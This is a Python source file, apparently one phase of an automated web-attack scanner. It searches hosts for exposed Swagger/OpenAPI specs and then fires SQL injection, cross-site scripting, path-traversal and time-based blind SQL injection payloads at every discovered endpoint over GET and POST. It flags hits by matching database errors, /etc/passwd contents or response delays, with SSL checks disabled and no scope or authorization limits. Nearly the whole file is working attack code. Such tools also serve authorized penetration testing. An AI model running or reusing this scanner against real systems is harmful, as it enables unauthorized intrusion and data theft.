import asyncio
import aiohttp
import logging
import re
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
from rich.console import Console

console = Console()
log = logging.getLogger("rich")

# --- OFFENSIVE PAYLOADS ---
PAYLOADS = {
    "SQLi": ["'", "1' OR '1'='1", "';--", "1\" OR \"1\"=\"1", "admin'--"],
    "XSS": ["<script>alert(1)</script>", "\"><img src=x onerror=prompt(1)>"],
    "LFI": ["../../../../../../../../etc/passwd", "../../../../windows/win.ini"]
}

CHRONOS_PAYLOADS = {
    "Time-Blind SQLi": ["1' OR SLEEP(6)--", "1); pg_sleep(6)--", "1'; WAITFOR DELAY '0:0:6'--", "1' AND (SELECT * FROM (SELECT(SLEEP(6)))a)--"]
}

DETECTIONS = {
    "SQLi": re.compile(r'(SQL syntax|mysql_fetch|ORA-\d{5}|PostgreSQL query failed|SQLite/JDBCDriver|SequelizeDatabaseError)', re.I),
    "XSS": re.compile(r'(<script>alert\(1\)</script>|"><img src=x onerror=prompt\(1\)>)', re.I),
    "LFI": re.compile(r'(root:x:0:0:|\[extensions\]|boot loader)', re.I)
}

COMMON_PARAMS = ["id", "page", "username", "email", "password", "file", "q"]

# Common paths where developers accidentally leave API blueprints exposed
SWAGGER_PATHS = [
    "/swagger.json", "/api/swagger.json", "/openapi.json", 
    "/v2/api-docs", "/v3/api-docs", "/api-docs", "/docs/api-docs.json"
]

async def hunt_swagger(client, base_url, session_state):
    """The Semantic Engine: Hunts for and parses OpenAPI/Swagger specifications."""
    parsed_base = urlparse(base_url)
    root_url = f"{parsed_base.scheme}://{parsed_base.netloc}"
    
    for path in SWAGGER_PATHS:
        target_url = urljoin(root_url, path)
        try:
            async with client.get(target_url, timeout=5, ssl=False) as response:
                if response.status == 200:
                    try:
                        data = await response.json()
                        if 'paths' in data or 'swagger' in data or 'openapi' in data:
                            console.print(f"[bold magenta]  [*] SEMANTIC BREACH: Found API Blueprint at {target_url}[/bold magenta]")
                            
                            # Parse the blueprint and inject the hidden routes into our State Graph
                            new_endpoints = 0
                            for api_path, methods in data.get('paths', {}).items():
                                full_api_url = urljoin(root_url, data.get('basePath', '') + api_path)
                                session_state.add_crawled_url(full_api_url)
                                new_endpoints += 1
                                
                            if new_endpoints > 0:
                                console.print(f"  + Extracted {new_endpoints} hidden API routes from Swagger spec.")
                            return True # Found it, stop hunting on this host
                    except Exception:
                        pass
        except Exception:
            pass
    return False

async def fuzz_endpoint(client, url, session_state):
    vulnerabilities_found = []
    parsed = urlparse(url)
    
    query_params = parse_qs(parsed.query)
    if not query_params:
        query_params = {p: ["1"] for p in COMMON_PARAMS}

    for param, values in query_params.items():
        # 1. Polyglot Fuzzing
        for vuln_type, payloads in PAYLOADS.items():
            for payload in payloads:
                fuzzed_params = query_params.copy()
                fuzzed_params[param] = [payload]
                target_url = urlunparse(parsed._replace(query=urlencode(fuzzed_params, doseq=True)))
                json_payload = {p: payload if p == param else "test" for p in query_params.keys()}

                try:
                    async with client.get(target_url, timeout=5, ssl=False) as r_get:
                        if DETECTIONS[vuln_type].search(await r_get.text()):
                            console.print(f"[red]  ! [HIGH] {vuln_type} triggered via GET on {url} (Param: {param})[/red]")
                            vulnerabilities_found.append({"type": "VULN", "name": f"GET {vuln_type}", "matched-at": url})
                            break 

                    headers = {"Content-Type": "application/json"}
                    async with client.post(url, json=json_payload, headers=headers, timeout=5, ssl=False) as r_post:
                        if DETECTIONS[vuln_type].search(await r_post.text()):
                            console.print(f"[red]  ! [HIGH] {vuln_type} triggered via POST on {url} (Key: {param})[/red]")
                            vulnerabilities_found.append({"type": "VULN", "name": f"POST {vuln_type}", "matched-at": url})
                            break
                except Exception: pass

        # 2. Chronos Temporal Fuzzing
        for vuln_type, payloads in CHRONOS_PAYLOADS.items():
            for payload in payloads:
                fuzzed_params = query_params.copy()
                fuzzed_params[param] = [payload]
                target_url = urlunparse(parsed._replace(query=urlencode(fuzzed_params, doseq=True)))
                json_payload = {p: payload if p == param else "test" for p in query_params.keys()}
                chronos_timeout = aiohttp.ClientTimeout(total=12) 

                try:
                    start_time = time.perf_counter()
                    async with client.get(target_url, timeout=chronos_timeout, ssl=False) as r_get:
                        await r_get.text()
                    elapsed = time.perf_counter() - start_time
                    if elapsed >= 5.5:
                        console.print(f"[red]  ! [CRITICAL] {vuln_type} (Delay: {elapsed:.2f}s) via GET on {url}[/red]")
                        vulnerabilities_found.append({"type": "VULN", "name": f"Chronos {vuln_type}", "matched-at": url})
                        break

                    headers = {"Content-Type": "application/json"}
                    start_time = time.perf_counter()
                    async with client.post(url, json=json_payload, headers=headers, timeout=chronos_timeout, ssl=False) as r_post:
                        await r_post.text()
                    elapsed = time.perf_counter() - start_time
                    if elapsed >= 5.5:
                        console.print(f"[red]  ! [CRITICAL] {vuln_type} (Delay: {elapsed:.2f}s) via POST on {url}[/red]")
                        vulnerabilities_found.append({"type": "VULN", "name": f"Chronos {vuln_type}", "matched-at": url})
                        break
                except asyncio.TimeoutError: pass
                except Exception: pass
                    
    return vulnerabilities_found

async def deploy_fuzzer(session_state, api_targets, root_hosts):
    connector = aiohttp.TCPConnector(limit=20, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as client:
        
        # Step 1: Deploy Semantic Swagger Hunters on root hosts
        if root_hosts:
            console.print(f"INFO     Deploying Semantic Hunters across {len(root_hosts)} root hosts...")
            swagger_tasks = [hunt_swagger(client, host, session_state) for host in root_hosts]
            await asyncio.gather(*swagger_tasks)
            await asyncio.sleep(0.5)
            
            # Re-fetch endpoints in case the Swagger Hunter injected new ones into the database
            api_targets = set()
            for u in session_state.get_crawled_urls():
                if isinstance(u, dict) and 'url' in u: api_targets.add(u['url'])
                elif isinstance(u, str): api_targets.add(u)
            api_targets = [t for t in api_targets if not re.search(r'\.(css|js|png|jpg|svg|woff2|ico)$', t, re.I)]

        # Step 2: Deploy Polyglot & Chronos Fuzzers
        CHUNK_SIZE = 100
        console.print(f"INFO     Executing Payload Fuzzing against {len(api_targets)} dynamic endpoints...")
        for i in range(0, len(api_targets), CHUNK_SIZE):
            chunk = api_targets[i:i + CHUNK_SIZE]
            tasks = [fuzz_endpoint(client, target, session_state) for target in chunk]
            results = await asyncio.gather(*tasks)
            
            for vuln_list in results:
                if vuln_list: session_state.vulnerabilities.extend(vuln_list)
            await asyncio.sleep(0.2)

def run_fuzzer(session, config):
    console.print("\n[bold blue]━━ PHASE 5: NATIVE API FUZZER (SEMANTIC, POLYGLOT & CHRONOS) ━━[/bold blue]")
    
    root_hosts = set()
    for h in session.get_live_hosts():
        if isinstance(h, dict) and 'url' in h: root_hosts.add(h['url'])
        elif isinstance(h, str): root_hosts.add(h)

    api_targets = set()
    for u in session.get_crawled_urls():
        if isinstance(u, dict) and 'url' in u: api_targets.add(u['url'])
        elif isinstance(u, str): api_targets.add(u)
        
    api_targets = [t for t in api_targets if not re.search(r'\.(css|js|png|jpg|svg|woff2|ico)$', t, re.I)]
    
    if not root_hosts and not api_targets:
        console.print("WARNING  No endpoints available for fuzzing.")
        return

    asyncio.run(deploy_fuzzer(session, list(api_targets), list(root_hosts)))
    console.print("  + Semantic & Native Fuzzing sequence complete.")
